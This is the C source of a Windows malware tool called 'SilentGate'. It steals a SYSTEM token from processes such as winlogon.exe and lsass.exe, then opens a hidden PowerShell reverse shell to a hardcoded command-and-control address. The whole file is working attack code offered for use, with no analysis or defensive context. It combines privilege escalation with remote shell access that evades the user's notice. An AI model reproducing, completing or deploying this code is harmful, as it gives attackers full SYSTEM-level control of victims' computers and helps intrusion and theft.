/*
 * SilentGate - Silent Token Steal
 * Author: JarDani
 * Steals SYSTEM token from existing process
 * No UAC. No driver. No user interaction.
 * Works from MEDIUM integrity if SeDebugPrivilege available
 * Works from HIGH integrity always
 */
#include <windows.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <stdio.h>

#ifndef C2_IP
#define C2_IP   0x90B2A8C0
#endif
#ifndef C2_PORT
#define C2_PORT 0xBB01
#endif

/* Target SYSTEM processes in order of preference */
const char* SYSTEM_PROCS[] = {
    "winlogon.exe",
    "lsass.exe", 
    "services.exe",
    "wininit.exe",
    "TrustedInstaller.exe",
    NULL
};

static DWORD find_pid(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    if(Process32First(snap, &pe)) {
        do {
            if(_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while(Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static HANDLE steal_system_token(void) {
    /* Enable SeDebugPrivilege */
    HANDLE hToken = NULL;
    if(OpenProcessToken(GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp = {0};
        tp.PrivilegeCount = 1;
        LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
                              &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        CloseHandle(hToken);
    }

    /* Try each SYSTEM process */
    for(int i = 0; SYSTEM_PROCS[i]; i++) {
        DWORD pid = find_pid(SYSTEM_PROCS[i]);
        if(!pid) continue;

        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION,
                                   FALSE, pid);
        if(!hProc) continue;

        HANDLE hProcToken = NULL;
        if(!OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY,
                             &hProcToken)) {
            CloseHandle(hProc);
            continue;
        }

        HANDLE hDupToken = NULL;
        if(DuplicateTokenEx(hProcToken,
                            TOKEN_ALL_ACCESS,
                            NULL,
                            SecurityImpersonation,
                            TokenPrimary,
                            &hDupToken)) {
            CloseHandle(hProcToken);
            CloseHandle(hProc);
            return hDupToken;
        }

        CloseHandle(hProcToken);
        CloseHandle(hProc);
    }
    return NULL;
}

int main(void) {
    Sleep(1000);

    /* Steal SYSTEM token */
    HANDLE hSystemToken = steal_system_token();

    /* Connect to C2 */
    WSADATA wsa = {0};
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                         NULL, 0, 0);

    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_port        = C2_PORT;
    sa.sin_addr.s_addr = C2_IP;

    if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        if(hSystemToken) CloseHandle(hSystemToken);
        WSACleanup();
        return 1;
    }

    SetHandleInformation((HANDLE)s, HANDLE_FLAG_INHERIT,
                         HANDLE_FLAG_INHERIT);

    STARTUPINFOA si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)s;
    si.hStdOutput  = (HANDLE)s;
    si.hStdError   = (HANDLE)s;

    PROCESS_INFORMATION pi = {0};
    char cmd[] = "powershell.exe -NoExit -NoP -NonI -W Hidden";

    if(hSystemToken) {
        /* Create process with SYSTEM token */
        CreateProcessWithTokenW(
            hSystemToken, 0,
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            L"powershell.exe -NoExit -NoP -NonI -W Hidden",
            CREATE_NO_WINDOW, NULL, NULL, 
            (LPSTARTUPINFOW)&si, &pi);
        CloseHandle(hSystemToken);
    }

    if(!pi.hProcess) {
        /* Fallback - regular shell */
        CreateProcessA(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            cmd, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    if(pi.hProcess) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
